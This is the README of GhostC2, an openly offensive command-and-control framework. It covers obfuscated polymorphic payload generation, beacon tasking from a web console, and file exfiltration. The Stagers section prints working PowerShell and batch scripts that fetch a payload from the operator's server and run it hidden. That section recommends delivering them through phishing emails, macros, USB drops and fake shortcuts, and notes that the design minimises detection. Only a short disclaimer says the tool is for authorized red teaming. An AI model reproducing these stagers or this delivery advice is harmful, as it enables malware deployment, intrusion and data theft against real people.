# 👻 GhostC2

GhostC2 is a modular, encrypted, post-exploitation command-and-control (C2) framework built with Python and Flask. It features real-time WebSocket communication, polymorphic payload generation, operator authentication, and optional `.exe` packaging. 

Check out the wiki for an Operator Quickstart Guide.

---

## 🚀 Features

- 🔐 AES-256 encrypted communication (symmetric)
- 🌐 Real-time bidirectional WebSocket tasking
- 🧠 Operator web console with live terminal view
- 🧬 Polymorphic payload generator with randomized variables
- 🖥️ Optional `.exe` compilation with PyInstaller
- 🛡️ Flask-Login based access control
- 🧾 SQLite-based task/result logging

---

## 📁 Project Structure

```
GhostC2/
├── builds/                 # Compiled payloads (.py, .exe)
├── output/                 # (Optional legacy output dir)
├── payloads/               # WebSocket and polling Python agents
│   └── ghost_socket_payload.py
├── server/
│   ├── app.py              # Main Flask + SocketIO server
│   └── templates/          # HTML templates for dashboard, console, login
├── tools/
│   └── generate_payload.py # Payload generator script
├── utils/
│   └── crypto.py           # AES encrypt/decrypt helpers
└── README.md
```

---

## ⚙️ Setup

### 1. Install dependencies
```bash
pip install flask flask-login flask-socketio eventlet pyinstaller
```

### 2. Run the server
```bash
cd server
python app.py
```

Visit [http://localhost:8080](http://localhost:8080)

**Default Login:**
```
Username: admin
Password: ghostpass123


```
---

## 👾 Payloads

### ✅ WebSocket Agent *(experimental – not recommended for active use)*
Basic agent that connects via WebSocket:

```bash
python payloads/ghost_socket_payload.py
```

---

### 🧬 Generate Polymorphic Payload *(recommended)*
This will generate an obfuscated Python payload that beacons to your GhostC2 server and executes incoming commands.

```bash
# Generate a Python payload only
python tools/generate_payload.py

# Generate Python + compile to .exe (requires PyInstaller)
python tools/generate_payload.py --exe
```

Output will be saved to the `builds/` directory.

---

### 🌐 Example: Generate payload for 10.10.10.10

```bash
python tools/generate_payload.py \
  --c2 http://10.10.10.10:8080/beacon \
  --result http://10.10.10.10:8080/result
```

To also compile to `.exe`:

```bash
python tools/generate_payload.py \
  --c2 http://10.10.10.10:8080/beacon \
  --result http://10.10.10.10:8080/result \
  --exe
```

## 🖥️ Live Console Terminal

GhostC2 now includes a fully interactive web-based console interface for live beacon tasking and output.

---

### ✅ Features

- Real-time command input/output per beacon
- Command and result formatting like a real terminal
- Preset task dropdown for quick recon commands
- Host selector for targeting individual beacons
- WebSocket-powered live updates
- Direct link from dashboard to console

---

### 📍 Accessing the Console

From the dashboard, click:

```
→ Open Live Console
```

Or visit directly:

```
http://your.c2.ip:8080/console
```

---

### 🧪 Example Output

```
$ whoami
ghost-operator

$ uname -a
Darwin MacBook-Pro.local 23.6.0 ...
```

---

### 🧩 Preset Commands

Quick tasks for both Windows and Linux/macOS:
- `whoami`
- `ipconfig` / `ifconfig`
- `systeminfo` / `uname -a`
- `tasklist` / `ps aux`
- `netstat` variants

---
## 📂 File Exfiltration

GhostC2 now supports secure, encoded file exfiltration via the live console or task queue.

---

### ✅ How It Works

Use the `getfile` command to retrieve any accessible file from a beacon:

```
getfile /etc/hosts
```

The agent will:

1. Read the specified file
2. Base64-encode its contents
3. POST the encoded data to the C2 server
4. The server will decode and save it to:
   ```
   server/downloads/<hostname>/<filename>
   ```

---

### 🔒 Notes

- Exfiltrated files are stored per-host for traceability
- Server-side decoding is automatic
- The `[EXFIL:<filepath>]` header ensures safe parsing
- Console output still displays result confirmation

---

### 🛠 Example

**Command:**
```
getfile /etc/hosts
```

**Console output:**
```
$ getfile /etc/hosts
[EXFIL:/etc/hosts]
aW50ZXJuZXQgY29ycnVwdGlvbiBldmVyeXdoZXJlCg==
```

**Server log:**
```
[DEBUG] Saving to: downloads/MacBook-Pro.local/hosts
[+] File received from MacBook-Pro.local: hosts saved to downloads/MacBook-Pro.local/hosts
```

---

### 📁 Tip

Add `server/downloads/` to your `.gitignore`:

```
# Avoid pushing exfiltrated files
server/downloads/
```

---

### ⏭️ Planned Enhancements

- UI for browsing & downloading exfiltrated files
- File overwrite warning system
- Directory / wildcard exfil support
- Operator action logging


### ⏭️ Coming Soon

- Per-host command logs
- Session tabs for multitarget ops

### 🎯 Stagers (Initial Access)

GhostC2 includes multiple **delivery stagers** in the `/stagers` directory, designed to fetch and execute the full agent from a remote server.

#### 🪖 PowerShell Stager (`payload_stager.ps1`)

Downloads and executes the payload from your GhostC2 host:

$payloadUrl = "http://your.server.ip/builds/ghost_payload.exe"
$localPath = "$env:TEMP\ghostsvc.exe"
Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath -UseBasicParsing
Start-Process -FilePath $localPath -WindowStyle Hidden

yaml
Copy
Edit

Use in:
- Phishing emails
- Macros
- USB drops
- Post-exploit scripting

---

#### 🧱 Batch Stager (`payload_stager.bat`)

Simple `.bat` version for Windows:

@echo off
set PAYLOAD_URL=http://your.server.ip/builds/ghost_payload.exe
set PAYLOAD_PATH=%TEMP%\ghostsvc.exe

powershell -Command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%PAYLOAD_PATH%' -UseBasicParsing"
start "" "%PAYLOAD_PATH%"

yaml
Copy
Edit

Use in:
- `.zip` phishing drops
- Fake `.lnk` shortcut chains
- Legacy script execution

---

### 🔐 Reminder

These stagers **do not contain the payload directly**. They fetch the compiled GhostC2 `.exe` agent at runtime — minimizing static detection and enabling modular deployment.



---




## 🔐 Security Notes

- All beacon traffic is AES-256 encrypted
- WebSocket messages are encrypted client/server-side
- Operators must log in via Flask-Login (sessions stored securely)

---

## 🧪 Red Team Use Cases

| Scenario              | Usage                                    |
|----------------------|------------------------------------------|
| Post-exploitation    | Remote shell via encrypted WebSocket     |
| Payload generation   | Obfuscated `.py` or `.exe` files         |
| Operator dashboards  | Web UI for task/result review            |
| C2 simulations       | Train detection or analyze traffic       |

---

## ⚠️ Legal

GhostC2 is provided for **educational and authorized red team use only**. Do not deploy this tool in any environment without proper authorization.

---

## 🧠 Built by Edward Wolfgang

- GitHub: [@wolfwashere](https://github.com/wolfwashere)
- Project: GhostC2 v1.0

Feel free to fork, contribute, or adapt for your research lab, red team, or academic project.
